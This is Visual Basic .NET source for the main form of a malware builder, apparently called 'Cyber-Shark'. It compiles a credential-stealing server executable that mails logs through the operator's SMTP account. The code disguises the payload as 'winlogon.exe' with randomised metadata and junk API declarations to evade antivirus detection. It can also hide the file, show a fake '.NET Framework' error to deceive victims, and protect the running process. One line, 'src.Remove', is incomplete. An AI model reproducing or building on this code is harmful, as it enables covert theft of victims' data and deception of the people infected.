'  ___________.__              ________          .__           __                                            ___.                                                                            
'  \__    ___/|  |__    ____   \_____  \   __ __ |__|  ____  _/  |_   ____  _______   ___.__.  ____   __ __  \_ |__    ____    ____    ____    _____    ____                                 
'    |    |   |  |  \ _/ __ \   /  / \  \ |  |  \|  |_/ __ \ \   __\_/ __ \ \_  __ \ <   |  | /  _ \ |  |  \  | __ \ _/ __ \ _/ ___\  /  _ \  /     \ _/ __ \                                
'    |    |   |   Y  \\  ___/  /   \_/.  \|  |  /|  |\  ___/  |  |  \  ___/  |  | \/  \___  |(  <_> )|  |  /  | \_\ \\  ___/ \  \___ (  <_> )|  Y Y  \\  ___/                                
'    |____|   |___|  / \___  > \_____\ \_/|____/ |__| \___  > |__|   \___  > |__|     / ____| \____/ |____/   |___  / \___  > \___  > \____/ |__|_|  / \___  >                               
'                  \/      \/         \__>                \/             \/           \/                          \/      \/      \/               \/      \/                                
'    __   .__                                                                                                         ___.    .__              __            .__                             
'  _/  |_ |  |__    ____     _____    ____  _______   ____    ___.__.  ____   __ __  _____   _______   ____   _____   \_ |__  |  |    ____   _/  |_   ____   |  |__    ____  _____   _______ 
'  \   __\|  |  \ _/ __ \   /     \  /  _ \ \_  __ \_/ __ \  <   |  | /  _ \ |  |  \ \__  \  \_  __ \_/ __ \  \__  \   | __ \ |  |  _/ __ \  \   __\ /  _ \  |  |  \ _/ __ \ \__  \  \_  __ \
'   |  |  |   Y  \\  ___/  |  Y Y  \(  <_> ) |  | \/\  ___/   \___  |(  <_> )|  |  /  / __ \_ |  | \/\  ___/   / __ \_ | \_\ \|  |__\  ___/   |  |  (  <_> ) |   Y  \\  ___/  / __ \_ |  | \/
'   |__|  |___|  / \___  > |__|_|  / \____/  |__|    \___  >  / ____| \____/ |____/  (____  / |__|    \___  > (____  / |___  /|____/ \___  >  |__|   \____/  |___|  / \___  >(____  / |__|   
'              \/      \/        \/                      \/   \/                          \/              \/       \/      \/            \/                       \/      \/      \/         
Imports System.Text


Public Class Form1

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim s As New SaveFileDialog
        With s
            .DefaultExt = "exe"
            .Filter = "Executable Files *.exe | *.exe"
            If .ShowDialog = Windows.Forms.DialogResult.OK Then

                Try
                    Dim src As String = My.Resources.Source

                    If TextUsername.Text.Contains("gmail") Then
                        src = src.Replace("moc.evil.ptms", StrReverse("smtp.gmail.com"))
                    End If

                    src = src.Replace("USERNAME", StrReverse(TextUsername.Text))
                    src = src.Replace("PASSWORD", StrReverse(TextPassword.Text))
                    src = src.Replace("123456789", TextInterval.Value * 60000)
                    src = src.Replace("winlogon.exe", TextName.Text)
                    src = src.Replace("REGDATA", Randomisi(10))
                    src = src.Replace("GlavniNinja", Randomisi(15))

                    src = src.Replace("^1^", Title.Text)
                    src = src.Replace("^2^", Description.Text)
                    src = src.Replace("^3^", Company.Text)
                    src = src.Replace("^4^", Product.Text)
                    src = src.Replace("^5^", trademark.Text)
                    src = src.Replace("^6^", Copyright.Text)

                    src = src.Replace("^%1^", broj(1))
                    src = src.Replace("^%2^", broj(1))
                    src = src.Replace("^%3^", broj(1))
                    src = src.Replace("^%4^", broj(1))
                    src = src.Remove


                    If TextInstall.Text = "" Then : Else
                        src = src.Replace("^PATH^", TextInstall.Text)
                    End If

                    'Checks
                    If CheckHide.Checked = True Then
                        src = src.Replace("^HIDE^", "IO.File.SetAttributes(Application.ExecutablePath, IO.FileAttributes.Hidden)")
                    Else
                        src = src.Replace("^HIDE^", "")
                    End If
                    If CheckError.Checked = True Then
                        src = src.Replace("^MSGBOX^", "Microsoft.VisualBasic.MsgBox(" & Chr(34) & ".NET Framework Error!" & Chr(34) & " & vbNewLine & " & Chr(34) & "Please update your Framework!" & Chr(34) & ", vbCritical, " & Chr(34) & ".NET Framework" & Chr(34) & ")")
                    Else
                        src = src.Replace("^MSGBOX^", "")
                    End If



                    If CheckAPI.Checked = True Then
                        src = src.Replace("^API1^", APIer())
                        src = src.Replace("^API2^", APIer())
                        src = src.Replace("^API3^", APIer())
                        src = src.Replace("^API4^", APIer())
                        src = src.Replace("^API5^", APIer())
                        src = src.Replace("^API6^", APIer())
                        src = src.Replace("^API7^", APIer())
                    Else
                        src = src.Replace("^API1^", "")
                        src = src.Replace("^API2^", "")
                        src = src.Replace("^API3^", "")
                        src = src.Replace("^API4^", "")
                        src = src.Replace("^API5^", "")
                        src = src.Replace("^API6^", "")
                        src = src.Replace("^API7^", "")
                    End If
                    If CheckJunk.Checked = True Then
                        src = src.Replace("^JUNK^", My.Resources.Junk)
                        src = src.Replace("^GETSOFTWARE^", "Dim UpSoft As String = " & Chr(34) & "Computer Uptime : " & Chr(34) & "& GetUptime() & vbNewLine & " & Chr(34) & "=== Installed Software ===" & Chr(34) & " & vbNewLine & GetSoftware()")
                        src = src.Replace("^GETTHEM^", "& vbNewLine & UpSoft")
                    Else
                        src = src.Replace("^JUNK^", "")
                        src = src.Replace("^GETSOFTWARE^", "")
                        src = src.Replace("^GETTHEM^", "")
                    End If
                    If CheckPProcess.Checked = True Then
                        src = src.Replace("^IMPORT^", "Imports System.Runtime.InteropServices")
                        src = src.Replace("^PROTECT^", "Dim PP As New cProtect" & vbNewLine & "PP.ProtectProcess(True)")
                        src = src.Replace("^PROTECT-Code^", My.Resources.Protect)
                    Else
                        src = src.Replace("^IMPORT^", "")
                        src = src.Replace("^PROTECT^", "")
                        src = src.Replace("^PROTECT-Code^", "")

                    End If
                    'End Checks
                    'Randomizer
                    src = src.Replace("^Logovi^", Randomisi(15))
                    src = src.Replace("^INSTALL^", Randomisi(15))
                    src = src.Replace("^t1^", Randomisi(15))
                    src = src.Replace("^t2^", Randomisi(15))
                    src = src.Replace("Tick1", Randomisi(15))
                    src = src.Replace("Tick2", Randomisi(15))
                    src = src.Replace("InstallMe", Randomisi(15))
                    src = src.Replace("^loc^", Randomisi(15))
                    src = src.Replace("^l^", Randomisi(15))
                    src = src.Replace("SendData", Randomisi(15))
                    src = src.Replace("^PasteBin^", Randomisi(15))
                    src = src.Replace("MailSetup", Randomisi(15))
                    src = src.Replace("^SMTP^", Randomisi(15))
                    'End Randomizer

                    IO.File.WriteAllText(.FileName & ".txt", src)

                    CS.Compile(.FileName, src, "")
                    If TextICON.Text = "" Then
                        IconChange.InjectIcon(.FileName, Application.StartupPath & "\Icons\def.ico")
                    Else
                        IconChange.InjectIcon(.FileName, TextICON.Text)
                    End If
                    MsgBox("Cyber-Shark Server Successfully Compiled!", vbInformation, "Success!")
                Catch : MsgBox(ErrorToString)

                End Try
            Else : Exit Sub
            End If
        End With
    End Sub
    Public Function APIer() As String
        On Error Resume Next
        Dim sb As New StringBuilder
        For i As Integer = 1 To 10
            sb.Append(vbNewLine + "Declare Unicode Function " & Randomisi(16) & " Lib """ & Randomisi(14) & ".dll" & """ (ByVal " & Randomisi(13) & " As String,ByVal " & Randomisi(12) & " As String(),ByVal " & Randomisi(11) & " As char) As Byte()" & vbNewLine)
        Next
        Return sb.ToString
    End Function
    Public Function Randomisi(ByVal lenght As Integer) As String
        On Error Resume Next
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    Public Function broj(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "123456789".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles iconbrowse.Click
        Dim o As New OpenFileDialog
        With o
            .DefaultExt = "ico"
            .Filter = "Icon Files *.ico | *.ico"
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                Dim Icon As New Icon(.FileName)
                TextICON.Text = .FileName
                iconpic.BackgroundImage = Icon.ToBitmap
            Else : Exit Sub
            End If
        End With
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles randyinfo.Click
        Title.Text = Randomisi(15)
        Description.Text = Randomisi(15)
        Company.Text = Randomisi(15)
        Product.Text = Randomisi(15)
        trademark.Text = Randomisi(15)
        Copyright.Text = Randomisi(15)
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        iconpic.BackgroundImage = My.Resources.r_5.ToBitmap
    End Sub

    Private Sub Label4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label4.Click

    End Sub

    Private Sub TabPage2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TabPage2.Click

    End Sub
End Class
